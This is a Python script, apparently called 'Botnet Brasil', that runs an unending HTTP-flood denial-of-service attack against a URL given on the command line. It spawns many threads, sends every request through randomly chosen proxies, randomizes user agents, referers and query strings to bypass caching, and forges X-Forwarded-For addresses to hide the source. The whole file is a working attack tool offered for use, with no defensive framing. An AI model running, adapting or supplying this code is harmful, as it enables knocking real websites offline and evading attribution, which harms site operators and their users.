import urllib.request
import sys
import threading
import random
import re
import time
import http.cookiejar
import uuid

def load_proxies():
    with open('proxies.txt', 'r') as file:
        return [line.strip() for line in file]

def useragent_list():
    with open('useragents.txt', 'r') as f:
        return [line.strip() for line in f]

def referer_list(host):
    with open('referers.txt', 'r') as f:
        headers_referers = [line.strip() for line in f]
    headers_referers.append('http://' + host + '/')
    return headers_referers

def buildblock(size):
    return ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(size))

def generate_cookie():
    return "session=" + uuid.uuid4().hex

def httpcall(url, proxy, headers_useragents, headers_referers):
    cookie_jar = http.cookiejar.CookieJar()
    proxy_support = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar), proxy_support)
    urllib.request.install_opener(opener)
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', random.randint(110, 120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Cookie', generate_cookie())
    request.add_header('X-Requested-With', 'XMLHttpRequest')
    request.add_header('DNT', '1')
    request.add_header('X-Forwarded-For', str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)))
    host = re.search('(https?://)?([^/]*)/?.*', url).group(2)
    request.add_header('Host', host)
    time.sleep(random.uniform(0.1, 2))
    try:
        urllib.request.urlopen(request)
    except Exception as e:
        pass

class HTTPThread(threading.Thread):
    def __init__(self, url, proxy, headers_useragents, headers_referers):
        threading.Thread.__init__(self)
        self.url = url
        self.proxy = proxy
        self.headers_useragents = headers_useragents
        self.headers_referers = headers_referers
    def run(self):
        while True:
            httpcall(self.url, self.proxy, self.headers_useragents, self.headers_referers)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Botnet Brasil created per Seyzalel.")
        print('Usage: python app.py <url> <threads>')
        sys.exit()
    url = sys.argv[1]
    threads_count = int(sys.argv[2])
    print("\nBrasil Botnet attack sent successfully!")
    print("Created per Seyzalel Menabel.")
    print(f"Target: {url}")
    print(f"Threads: {threads_count}")
    print("Duration: Infinite Loop")
    print("\nTodos os direitos desta Botnet são reservados a Seyzalel Menabel, sua utilização e distribuição sem consentimento explícito são estritamente proibidos.\n")
    proxies = load_proxies()
    headers_useragents = useragent_list()
    headers_referers = referer_list(re.search('(https?://)?([^/]*)/?.*', url).group(2))
    for i in range(threads_count):
        proxy = random.choice(proxies)
        t = HTTPThread(url, proxy, headers_useragents, headers_referers)
        t.start()